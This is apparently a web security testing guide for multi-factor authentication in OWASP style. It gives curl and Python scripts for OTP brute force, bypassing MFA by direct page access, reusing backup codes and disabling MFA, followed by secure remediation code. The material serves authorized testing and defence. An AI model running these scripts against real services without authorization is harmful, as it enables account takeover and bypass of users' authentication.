# WSTG-ATHN-11: Testing Multi-Factor Authentication (MFA)

## Test ID
WSTG-ATHN-11

## Test Name
Testing Multi-Factor Authentication (MFA)

## High-Level Description

Multi-Factor Authentication adds an additional layer of security beyond passwords. This test examines the implementation of MFA for weaknesses such as bypass vulnerabilities, weak OTP generation, lack of rate limiting, and improper enrollment procedures. A flawed MFA implementation can give users false confidence while not actually providing meaningful protection.

---

## What to Check

### MFA Implementation

- [ ] MFA bypass possibilities
- [ ] OTP strength and predictability
- [ ] Rate limiting on OTP attempts
- [ ] Backup code security
- [ ] MFA enrollment process
- [ ] Recovery mechanism security
- [ ] Session handling after MFA

### Common Weaknesses

| Weakness | Description |
|----------|-------------|
| Direct page access | Bypass MFA by accessing post-auth pages |
| Response manipulation | Change response to indicate MFA success |
| Brute force OTP | No rate limiting on attempts |
| Weak OTP generation | Predictable codes |
| Backup code reuse | Codes not single-use |

---

## How to Test

### Step 1: Test MFA Bypass via Direct Access

```bash
# After completing first factor, try to access protected pages directly
# without completing MFA

# Get session after password auth
session=$(curl -s -X POST "https://target.com/api/login" \
    -H "Content-Type: application/json" \
    -d '{"username":"test","password":"password"}' \
    -c - | grep session | awk '{print $7}')

# Try to access protected resources without MFA completion
protected_pages=(
    "/dashboard"
    "/account"
    "/api/user"
    "/settings"
    "/api/sensitive-data"
)

for page in "${protected_pages[@]}"; do
    response=$(curl -s "https://target.com$page" \
        -H "Cookie: session=$session" \
        -w "\nStatus: %{http_code}")

    echo "$page: $(echo "$response" | tail -1)"
done
```

### Step 2: Test OTP Brute Force

```bash
#!/bin/bash
# Test rate limiting on OTP attempts

MFA_TOKEN="temporary_mfa_token"

for otp in {000000..000100}; do
    response=$(curl -s -X POST "https://target.com/api/verify-mfa" \
        -H "Content-Type: application/json" \
        -d "{\"token\":\"$MFA_TOKEN\",\"otp\":\"$otp\"}" \
        -w "\n%{http_code}")

    status=$(echo "$response" | tail -1)

    if [ "$status" == "429" ]; then
        echo "Rate limited after trying OTP: $otp"
        break
    fi

    if echo "$response" | grep -qi "success"; then
        echo "[SUCCESS] Valid OTP: $otp"
        break
    fi
done
```

### Step 3: Test OTP Predictability

```bash
#!/bin/bash
# Collect multiple OTPs to analyze patterns

echo "Request OTPs at different times to analyze patterns:"

for i in {1..10}; do
    # Request SMS/Email OTP
    response=$(curl -s -X POST "https://target.com/api/send-otp" \
        -H "Authorization: Bearer $MFA_TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"method":"email"}')

    echo "Request $i at $(date +%s): $response"
    sleep 5
done

# Check received OTPs for patterns:
# - Sequential?
# - Timestamp-based?
# - Short length?
```

### Step 4: Test Response Manipulation

```bash
# Test if changing response allows MFA bypass

# This is typically done with Burp Suite:
# 1. Submit wrong OTP
# 2. Intercept response
# 3. Change {"success": false} to {"success": true}
# 4. Check if access is granted

# Programmatic test:
# Submit with wrong OTP and check server-side validation
curl -s -X POST "https://target.com/api/verify-mfa" \
    -H "Content-Type: application/json" \
    -d '{"token":"mfa_token","otp":"000000"}' \
    -v 2>&1 | grep -i "set-cookie"

# If new session cookie is set even with wrong OTP, there's an issue
```

### Step 5: Test Backup Codes

```bash
# Test backup code security

# Use a backup code
backup_code="BACKUP-CODE-1"

curl -s -X POST "https://target.com/api/verify-mfa" \
    -H "Authorization: Bearer $MFA_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"backup_code\":\"$backup_code\"}"

# Try to use the same code again
response=$(curl -s -X POST "https://target.com/api/verify-mfa" \
    -H "Authorization: Bearer $MFA_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"backup_code\":\"$backup_code\"}")

if echo "$response" | grep -qi "success"; then
    echo "[VULN] Backup code can be reused!"
else
    echo "[OK] Backup code is single-use"
fi
```

### Step 6: Test MFA Enrollment Vulnerabilities

```bash
# Test if MFA can be disabled without verification

# Try to disable MFA without OTP
curl -s -X POST "https://target.com/api/disable-mfa" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{}'

# Try to change MFA method without verification
curl -s -X POST "https://target.com/api/update-mfa" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"method":"sms","phone":"+1234567890"}'

# Test if MFA enrollment can be bypassed
curl -s -X POST "https://target.com/api/enable-mfa" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"method":"totp","skip_verification":true}'
```

### Step 7: Test "Remember This Device" Feature

```bash
# Test if "remember device" can be abused

# Enable remember device
curl -s -X POST "https://target.com/api/verify-mfa" \
    -H "Content-Type: application/json" \
    -d '{"token":"mfa_token","otp":"123456","remember_device":true}' \
    -c cookies.txt

# Check device token
cat cookies.txt | grep -i "device\|remember\|trusted"

# Test if device token works from different IP
curl -s "https://target.com/api/login" \
    -H "X-Forwarded-For: 1.2.3.4" \
    -b cookies.txt

# Test device token expiration
# Test if token works on different browsers
```

### Step 8: Test TOTP Implementation

```bash
#!/usr/bin/env python3
# Test TOTP implementation security

import pyotp
import time

# If you have access to the TOTP secret
secret = "TEST_SECRET_KEY"
totp = pyotp.TOTP(secret)

# Test if old codes are accepted (time window too large)
old_code = totp.at(time.time() - 120)  # 2 minutes ago
response = requests.post(
    "https://target.com/api/verify-mfa",
    json={"otp": old_code}
)
print(f"2-minute old code: {response.status_code}")

# Test if future codes are accepted
future_code = totp.at(time.time() + 120)  # 2 minutes ahead
response = requests.post(
    "https://target.com/api/verify-mfa",
    json={"otp": future_code}
)
print(f"2-minute future code: {response.status_code}")

# Codes should only be valid for ~30 seconds window
```

---

## Tools

### MFA Testing

| Tool | Description | Usage |
|------|-------------|-------|
| **Burp Suite** | Response manipulation | MFA bypass testing |
| **pyotp** | TOTP testing | Code generation/analysis |
| **Custom scripts** | Automated testing | OTP brute force |

### Analysis

| Tool | Description |
|------|-------------|
| **oathtool** | TOTP/HOTP generation |
| **Python** | Custom analysis scripts |

---

## Example Commands/Payloads

### MFA Security Tester

```python
#!/usr/bin/env python3
import requests
import time
import pyotp

class MFATester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = {}

    def test_bypass_direct_access(self, partial_auth_cookie, protected_pages):
        """Test if MFA can be bypassed by direct page access"""
        print("[*] Testing direct page access bypass...")

        vulnerable = []
        for page in protected_pages:
            response = self.session.get(
                f"{self.base_url}{page}",
                cookies={"session": partial_auth_cookie}
            )

            if response.status_code == 200 and "login" not in response.url.lower():
                vulnerable.append(page)

        self.results["direct_access_bypass"] = {
            "vulnerable_pages": vulnerable,
            "vulnerable": len(vulnerable) > 0
        }

    def test_otp_brute_force(self, mfa_token, max_attempts=100):
        """Test rate limiting on OTP attempts"""
        print("[*] Testing OTP brute force protection...")

        blocked_at = None

        for i in range(max_attempts):
            otp = str(i).zfill(6)

            response = self.session.post(
                f"{self.base_url}/api/verify-mfa",
                json={"token": mfa_token, "otp": otp}
            )

            if response.status_code == 429:
                blocked_at = i + 1
                break

        self.results["otp_brute_force"] = {
            "blocked_after": blocked_at,
            "no_rate_limit": blocked_at is None or blocked_at > 10
        }

    def test_backup_code_reuse(self, mfa_token, backup_code):
        """Test if backup codes can be reused"""
        print("[*] Testing backup code reuse...")

        # First use
        response1 = self.session.post(
            f"{self.base_url}/api/verify-mfa",
            json={"token": mfa_token, "backup_code": backup_code}
        )

        # Second use
        response2 = self.session.post(
            f"{self.base_url}/api/verify-mfa",
            json={"token": mfa_token, "backup_code": backup_code}
        )

        self.results["backup_code_reuse"] = {
            "first_use": response1.status_code,
            "second_use": response2.status_code,
            "vulnerable": response2.status_code == 200
        }

    def test_totp_window(self, secret):
        """Test if TOTP accepts codes outside valid window"""
        print("[*] Testing TOTP time window...")

        totp = pyotp.TOTP(secret)
        now = time.time()

        # Test codes from different times
        time_offsets = [-300, -180, -120, -60, -30, 0, 30, 60, 120, 180, 300]
        accepted = []

        for offset in time_offsets:
            code = totp.at(now + offset)

            response = self.session.post(
                f"{self.base_url}/api/verify-mfa",
                json={"otp": code}
            )

            if response.status_code == 200:
                accepted.append(offset)

        self.results["totp_window"] = {
            "accepted_offsets": accepted,
            "too_wide": any(abs(o) > 60 for o in accepted)
        }

    def test_mfa_disable(self, auth_token):
        """Test if MFA can be disabled without verification"""
        print("[*] Testing MFA disable security...")

        # Try to disable without OTP
        response = self.session.post(
            f"{self.base_url}/api/disable-mfa",
            headers={"Authorization": f"Bearer {auth_token}"},
            json={}
        )

        self.results["mfa_disable"] = {
            "requires_verification": response.status_code != 200,
            "vulnerable": response.status_code == 200
        }

    def test_session_after_mfa(self, pre_mfa_session, post_mfa_session):
        """Test if session changes after MFA"""
        print("[*] Testing session handling after MFA...")

        self.results["session_after_mfa"] = {
            "same_session": pre_mfa_session == post_mfa_session,
            "vulnerable": pre_mfa_session == post_mfa_session
        }

    def generate_report(self):
        """Generate MFA security report"""
        print("\n" + "=" * 60)
        print("MFA SECURITY TEST REPORT")
        print("=" * 60 + "\n")

        vulnerabilities = []

        for test_name, result in self.results.items():
            vulnerable = result.get("vulnerable", False) or result.get("no_rate_limit", False)
            status = "[VULN]" if vulnerable else "[OK]"

            print(f"{status} {test_name}")
            for key, value in result.items():
                if key not in ["vulnerable"]:
                    print(f"    {key}: {value}")

            if vulnerable:
                vulnerabilities.append(test_name)

            print()

        print("=" * 60)
        print(f"Total vulnerabilities: {len(vulnerabilities)}")
        if vulnerabilities:
            print("Issues found:")
            for v in vulnerabilities:
                print(f"  - {v}")

# Usage
tester = MFATester("https://target.com")
tester.test_bypass_direct_access("partial_session", ["/dashboard", "/settings"])
tester.test_otp_brute_force("mfa_token")
tester.generate_report()
```

---

## Remediation Guide

### 1. Secure MFA Implementation

```python
import pyotp
import secrets
from datetime import datetime, timedelta

class SecureMFA:
    MAX_OTP_ATTEMPTS = 5
    OTP_LOCKOUT_DURATION = 900  # 15 minutes
    TOTP_VALID_WINDOW = 1  # Only current and previous code

    def __init__(self, redis_client):
        self.redis = redis_client

    def generate_totp_secret(self):
        """Generate secure TOTP secret"""
        return pyotp.random_base32()

    def verify_totp(self, user_id, code):
        """Verify TOTP with rate limiting and narrow window"""

        # Check rate limit
        if not self.check_rate_limit(user_id):
            return False, "Too many attempts"

        user = User.query.get(user_id)
        totp = pyotp.TOTP(user.totp_secret)

        # Verify with narrow window (only current and previous code)
        if totp.verify(code, valid_window=self.TOTP_VALID_WINDOW):
            # Check if code was already used (replay protection)
            if self.is_code_used(user_id, code):
                return False, "Code already used"

            self.mark_code_used(user_id, code)
            self.clear_attempts(user_id)
            return True, None

        self.record_failed_attempt(user_id)
        return False, "Invalid code"

    def check_rate_limit(self, user_id):
        """Check if user is rate limited"""
        lockout_key = f"mfa_lockout:{user_id}"
        if self.redis.exists(lockout_key):
            return False

        attempts_key = f"mfa_attempts:{user_id}"
        attempts = int(self.redis.get(attempts_key) or 0)

        if attempts >= self.MAX_OTP_ATTEMPTS:
            self.redis.setex(lockout_key, self.OTP_LOCKOUT_DURATION, "1")
            return False

        return True

    def record_failed_attempt(self, user_id):
        """Record failed MFA attempt"""
        key = f"mfa_attempts:{user_id}"
        self.redis.incr(key)
        self.redis.expire(key, 3600)

    def is_code_used(self, user_id, code):
        """Check if code was already used (prevent replay)"""
        key = f"mfa_used_codes:{user_id}"
        return self.redis.sismember(key, code)

    def mark_code_used(self, user_id, code):
        """Mark code as used"""
        key = f"mfa_used_codes:{user_id}"
        self.redis.sadd(key, code)
        self.redis.expire(key, 120)  # Codes expire after 2 minutes anyway

    def generate_backup_codes(self, user_id, count=10):
        """Generate single-use backup codes"""
        codes = []
        for _ in range(count):
            code = secrets.token_hex(4).upper()
            codes.append(code)

        # Store hashed codes
        for code in codes:
            BackupCode.create(
                user_id=user_id,
                code_hash=hash_code(code),
                used=False
            )

        return codes

    def verify_backup_code(self, user_id, code):
        """Verify and consume backup code"""
        code_hash = hash_code(code)

        backup = BackupCode.query.filter_by(
            user_id=user_id,
            code_hash=code_hash,
            used=False
        ).first()

        if not backup:
            return False

        # Mark as used
        backup.used = True
        backup.used_at = datetime.utcnow()
        db.session.commit()

        return True
```

### 2. Secure MFA Flow

```python
@app.route('/api/verify-mfa', methods=['POST'])
def verify_mfa():
    mfa_token = request.json.get('mfa_token')
    otp = request.json.get('otp')
    backup_code = request.json.get('backup_code')

    # Validate MFA token
    token_data = mfa_service.validate_temp_token(mfa_token)
    if not token_data:
        return jsonify({"error": "Invalid or expired MFA token"}), 401

    user_id = token_data['user_id']

    # Verify OTP or backup code
    if otp:
        success, error = mfa_service.verify_totp(user_id, otp)
    elif backup_code:
        success = mfa_service.verify_backup_code(user_id, backup_code)
        error = None if success else "Invalid backup code"
    else:
        return jsonify({"error": "OTP or backup code required"}), 400

    if not success:
        return jsonify({"error": error}), 401

    # Create NEW session (not reuse pre-MFA session)
    session = create_new_session(user_id, mfa_verified=True)

    # Invalidate MFA temp token
    mfa_service.invalidate_temp_token(mfa_token)

    return jsonify({"session_token": session.token})
```

### 3. Require MFA for Sensitive Operations

```python
def require_mfa_verification(f):
    """Decorator to require recent MFA verification"""
    @wraps(f)
    def decorated(*args, **kwargs):
        if not current_user.mfa_enabled:
            return f(*args, **kwargs)

        # Check if MFA was recently verified
        last_mfa = session.get('last_mfa_verification')
        if not last_mfa or (datetime.utcnow() - last_mfa).seconds > 300:
            return jsonify({
                "error": "MFA verification required",
                "require_mfa": True
            }), 403

        return f(*args, **kwargs)
    return decorated

@app.route('/api/disable-mfa', methods=['POST'])
@login_required
@require_mfa_verification  # Require fresh MFA before disabling
def disable_mfa():
    otp = request.json.get('otp')

    if not mfa_service.verify_totp(current_user.id, otp):
        return jsonify({"error": "Invalid OTP"}), 401

    current_user.mfa_enabled = False
    current_user.totp_secret = None
    db.session.commit()

    # Notify user
    send_mfa_disabled_notification(current_user)

    return jsonify({"message": "MFA disabled"})
```

---

## Risk Assessment

### CVSS Score

| Finding | CVSS | Severity |
|---------|------|----------|
| MFA bypass via direct access | 9.8 | Critical |
| No rate limiting on OTP | 8.8 | High |
| Backup code reuse | 7.5 | High |
| Wide TOTP time window | 5.3 | Medium |
| MFA disable without verification | 7.5 | High |

---

## CWE Categories

| CWE ID | Title | Description |
|--------|-------|-------------|
| **CWE-308** | Use of Single-factor Authentication | MFA bypass |
| **CWE-307** | Improper Restriction of Excessive Authentication Attempts | OTP brute force |
| **CWE-287** | Improper Authentication | MFA implementation flaws |

---

## References

- [OWASP WSTG - Testing Multi-Factor Authentication](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication)
- [OWASP MFA Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)
- [NIST Digital Identity Guidelines - MFA](https://pages.nist.gov/800-63-3/)

---

## Checklist

```
[ ] MFA bypass via direct access tested
[ ] OTP brute force protection tested
[ ] OTP predictability analyzed
[ ] Response manipulation tested
[ ] Backup code single-use verified
[ ] Backup code security tested
[ ] MFA enrollment security tested
[ ] MFA disable security tested
[ ] Remember device feature tested
[ ] TOTP time window verified
[ ] Session handling after MFA tested
[ ] Findings documented
[ ] Remediation recommendations provided
```
